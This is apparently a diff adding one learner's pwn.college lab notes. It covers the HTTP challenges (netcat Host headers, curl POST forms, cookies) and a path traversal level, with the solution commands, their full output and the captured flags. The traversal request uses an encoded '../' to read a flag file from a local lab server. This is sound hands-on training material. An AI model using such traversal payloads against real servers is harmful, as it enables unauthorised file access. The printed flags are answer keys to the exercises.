@@ -513,9 +513,165 @@ NOTE: Needless to say, this will render your environment unusable. Just restart 
         print(r.text)
 
 
+11. HTTP Host Header (netcat)
+
+    And, finally, you can learn how Hosts are actually sent over the network in netcat. This might be a bit trickier. You can actually use curl as a source of information here! Curl's -v option causes it to print out the exact headers it's sending over (and the ones it receives!). Observe it, copy that with netcat, and get the flag!
+
+    - my solution
+        hacker@talking-web~http-host-header-netcat:~$ curl -v challenge.localhost/progress
+        * Host challenge.localhost:80 was resolved.
+        * IPv6: ::1
+        * IPv4: 127.0.0.1
+        *   Trying [::1]:80...
+        * connect to ::1 port 80 from ::1 port 56298 failed: Connection refused
+        *   Trying 127.0.0.1:80...
+        * Connected to challenge.localhost (127.0.0.1) port 80
+        * using HTTP/1.x
+        > GET /progress HTTP/1.1
+        > Host: challenge.localhost
+        > User-Agent: curl/8.12.1
+        > Accept: */*
+        > 
+        * Request completely sent off
+        < HTTP/1.1 404 NOT FOUND
+        < Server: Werkzeug/3.0.6 Python/3.8.10
+        < Date: Thu, 12 Jun 2025 01:38:13 GMT
+        < Content-Type: text/html; charset=utf-8
+        < Content-Length: 207
+        < Connection: close
+        < 
+        <!doctype html>
+        <html lang=en>
+        <title>404 Not Found</title>
+        <h1>Not Found</h1>
+        <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+        * shutting down connection #0
+
+        hacker@talking-web~http-host-header-netcat:~$ nc -v challenge.localhost 80
+        Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!
+        GET /progress HTTP/1.1
+        Host: pwnable.tw
+
+        HTTP/1.1 200 OK
+        Server: Werkzeug/3.0.6 Python/3.8.10
+        Date: Thu, 12 Jun 2025 01:41:30 GMT
+        Content-Type: text/html; charset=utf-8
+        Content-Length: 224
+        Connection: close
+
+
+                <html>
+                <head><title>Talking Web</title></head>
+                <body>
+                <h1>Great job!</h1>
+                <p>pwn.college{8nY8O6TuliVy8maPBPJB7RiEObj.QXycjMzwiNxQjMyEzW}</p>
+                </body>
+                </html>
+
+
+17. HTTP Forms (curl)
+
+    Now, let's try this with curl. Look at the man page to figure out how to make a post request (HINT: the most relevant option is -d).
+
+    NOTE: Remember what we said about attackers being able to trigger whatever HTTP requests they wanted? Note how this challenge doesn't even have any functionality to make the form, but you can still hit it with the POST request!
+
+    - my solution:
+    hacker@talking-web~http-forms-curl:~$ curl -d key=zlpkzvoh "http://challenge.localhost:80/progress"
+
+            <html>
+            <head><title>Talking Web</title></head>
+            <body>
+            <h1>Great job!</h1>
+            <p>pwn.college{IbwS5OL_--0hD5U-aXg9mo2i6p5.QX2gjMzwiNxQjMyEzW}</p>
+            </body>
+            </html>
+
+26. HTTP Cookies (curl)
+    Include a cookie from HTTP response using curl
+
+    - my solution:
+        hacker@talking-web~http-cookies-curl:~$ curl -v http://127.0.0.1:80
+        *   Trying 127.0.0.1:80...
+        * TCP_NODELAY set
+        * Connected to 127.0.0.1 (127.0.0.1) port 80 (#0)
+        > GET / HTTP/1.1
+        > Host: 127.0.0.1
+        > User-Agent: curl/7.68.0
+        > Accept: */*
+        > 
+        * Mark bundle as not supporting multiuse
+        < HTTP/1.1 302 FOUND
+        < Server: Werkzeug/3.0.6 Python/3.8.10
+        < Date: Thu, 12 Jun 2025 08:59:25 GMT
+        < Content-Length: 189
+        < Location: /
+        < Set-Cookie: cookie=f387c1b9a40bdb164a3bd4fab91368bd; Path=/
+        < Server: pwn.college
+        < Connection: close
+        < 
+        <!doctype html>
+        <html lang=en>
+        <title>Redirecting...</title>
+        <h1>Redirecting...</h1>
+        <p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+        * Closing connection 0
+        hacker@talking-web~http-cookies-curl:~$ curl -v -b cookie=f387c1b9a40bdb164a3bd4fab91368bd http://127.0.0.1:80
+        *   Trying 127.0.0.1:80...
+        * TCP_NODELAY set
+        * Connected to 127.0.0.1 (127.0.0.1) port 80 (#0)
+        > GET / HTTP/1.1
+        > Host: 127.0.0.1
+        > User-Agent: curl/7.68.0
+        > Accept: */*
+        > Cookie: cookie=f387c1b9a40bdb164a3bd4fab91368bd
+        > 
+        * Mark bundle as not supporting multiuse
+        < HTTP/1.1 200 OK
+        < Server: Werkzeug/3.0.6 Python/3.8.10
+        < Date: Thu, 12 Jun 2025 09:00:32 GMT
+        < Content-Length: 60
+        < Server: pwn.college
+        < Connection: close
+        < 
+        pwn.college{EUBgsEqRRNiB6Qw6IR4E8KBQktw.QXxAzMzwiNxQjMyEzW}
+        * Closing connection 0
 
 
 
+# Intro to Cybersecurity
 
+## Web Security
 
+1. Path Traversal 1
 
+This level will explore the intersection of Linux path resolution, when done naively, and unexpected web requests from an attacker. We've implemented a simple web server for you --- it will serve up files from /challenge/files over HTTP. Can you trick it into giving you the flag?
+
+The webserver program is /challenge/server. You can run it just like any other challenge, then talk to it over HTTP (using a different terminal or a web browser). We recommend reading through its code to understand what it is doing and to find the weakness!
+
+HINT: If you're wondering why your solution isn't working, make sure what you're trying to query is what is actually being received by the server! curl -v [url] can show you the exact bytes that curl is sending over.
+
+- my solution
+    hacker@web-security~path-traversal-1:~$ curl -v http://challenge.localhost:80/repository/%2E%2E%2F%2E%2E/flag
+    * Host challenge.localhost:80 was resolved.
+    * IPv6: ::1
+    * IPv4: 127.0.0.1
+    *   Trying [::1]:80...
+    * connect to ::1 port 80 from ::1 port 56772 failed: Connection refused
+    *   Trying 127.0.0.1:80...
+    * Connected to challenge.localhost (127.0.0.1) port 80
+    * using HTTP/1.x
+    > GET /repository/%2E%2E%2F%2E%2E/flag HTTP/1.1
+    > Host: challenge.localhost
+    > User-Agent: curl/8.12.1
+    > Accept: */*
+    > 
+    * Request completely sent off
+    < HTTP/1.1 200 OK
+    < Server: Werkzeug/3.0.6 Python/3.8.10
+    < Date: Thu, 12 Jun 2025 07:10:08 GMT
+    < Content-Type: text/html; charset=utf-8
+    < Content-Length: 60
+    < Connection: close
+    < 
+    pwn.college{YFNeZ9Qv6G3Ayx3WpUe13_anpVN.QX3gzMzwiNxQjMyEzW}
+    * shutting down connection #0
